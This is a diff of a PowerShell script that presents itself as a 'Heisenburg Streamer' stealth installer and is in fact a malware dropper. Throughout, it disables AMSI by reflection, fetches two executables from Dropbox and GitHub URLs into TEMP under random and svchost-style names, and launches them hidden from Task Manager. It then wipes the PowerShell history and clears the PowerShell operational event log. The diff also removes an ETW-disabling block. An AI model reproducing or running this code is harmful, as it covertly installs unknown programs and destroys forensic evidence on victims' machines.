@@ -1,5 +1,5 @@
 # ========================================================
-# HEISENBURG STREAMER - HYPER-STREAM INSTALLATION v6.3 (STEALTH)
+# HEISENBURG STREAMER - HYPER-STREAM INSTALLATION v6.4 (STEALTH)
 # ========================================================
 
 function Check-Admin {
@@ -16,34 +16,18 @@ if (-not (Check-Admin)) {
 try {
     [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
     [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-   
-    # Disable ETW
-    $etw = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
-    if ($etw) {
-        $etwField = $etw.GetField('etwProvider','NonPublic,Static')
-        if ($etwField) { $etwField.SetValue($null, 0) }
-    }
 } catch {}
 
 # ================= CONFIG =================
 $MainExeUrl = "https://www.dropbox.com/scl/fi/iwv6cm1n1qo3kdn9gmn36/RtkAudUService64.exe?rlkey=csrph0p954x523nhvxoqf8m9z&st=1c2xz36h&dl=1"
 
-# ←←← APNI STEALTH LAUNCHER EXE KA DIRECT LINK YAHAN DAAL DO
-$StealthLauncherUrl = "https://raw.githubusercontent.com/sandeepmanglekar17-sys/stealthlauncher/refs/heads/main/StealthLauncher.exe"   
+# ←←← APNI STEALTH LAUNCHER EXE KA DIRECT LINK
+$StealthLauncherUrl = "https://raw.githubusercontent.com/sandeepmanglekar17-sys/stealthlauncher/refs/heads/main/StealthLauncher.exe"
 
 $RandomName = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_})
 $MainExePath = "$env:TEMP\$RandomName.exe"
 $LauncherPath = "$env:TEMP\svchost_$RandomName.exe"
 # =========================================
-
-function Draw-ProgressBar {
-    param([int]$Percent, [string]$Status)
-    $width = 40
-    $done = [Math]::Floor($Percent / 100 * $width)
-    $left = $width - $done
-    $bar = "[" + ("=" * $done) + ">" + ("." * $left) + "]"
-    Write-Host -NoNewline "`r[*] ${Status}: $bar $Percent% " -ForegroundColor Cyan
-}
 
 Write-Host "`n[+] INITIALIZING SYSTEM HYPER-CONNECTION..." -ForegroundColor Yellow
 Write-Host "[+] OPTIMIZING SYSTEM ENVIRONMENT..." -ForegroundColor Gray
@@ -58,17 +42,17 @@ try {
 
 # Download Main EXE
 Write-Host "[+] SYNCHRONIZING CORE AGENT..." -ForegroundColor Gray
-Invoke-WebRequest -Uri $MainExeUrl -OutFile $MainExePath -UseBasicParsing
+Invoke-WebRequest -Uri $MainExeUrl -OutFile $MainExePath -UseBasicParsing -UserAgent "Mozilla/5.0" -TimeoutSec 60
 Write-Host "[+] Core Agent Downloaded Successfully" -ForegroundColor Green
 
 # Download Stealth Launcher
 Write-Host "[+] DOWNLOADING STEALTH PROTECTION..." -ForegroundColor Gray
-Invoke-WebRequest -Uri $StealthLauncherUrl -OutFile $LauncherPath -UseBasicParsing
+Invoke-WebRequest -Uri $StealthLauncherUrl -OutFile $LauncherPath -UseBasicParsing -UserAgent "Mozilla/5.0" -TimeoutSec 60
 Write-Host "[+] Stealth Launcher Downloaded" -ForegroundColor Green
 
 Write-Host "[+] DEPLOYING STEALTH AGENT..." -ForegroundColor Cyan
 
-# Run Stealth Launcher with Main EXE Path as Argument
+# Run Stealth Launcher
 $si = New-Object System.Diagnostics.ProcessStartInfo
 $si.FileName = $LauncherPath
 $si.Arguments = "`"$MainExePath`""
@@ -83,7 +67,7 @@ Write-Host "`n[+] STEALTH MODE SUCCESSFULLY ACTIVATED!" -ForegroundColor Green
 Write-Host "[*] Your process is now hidden from Task Manager" -ForegroundColor White
 Write-Host "[*] Keep this window minimized" -ForegroundColor Gray
 
-# Final Cleanup
+# Cleanup
 if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt") {
     "" | Out-File "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force
 }
@@ -93,8 +77,7 @@ wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
 Write-Host "[+] SETUP COMPLETE.`n" -ForegroundColor Green
 
 } catch {
-    Write-Host "`n[!] CRITICAL ERROR: System synchronization interrupted." -ForegroundColor Red
+    Write-Host "`n[!] CRITICAL ERROR: $($_.Exception.Message)" -ForegroundColor Red
 }
 
-# Self Destruct
 Remove-Variable * -ErrorAction SilentlyContinue 2>$null
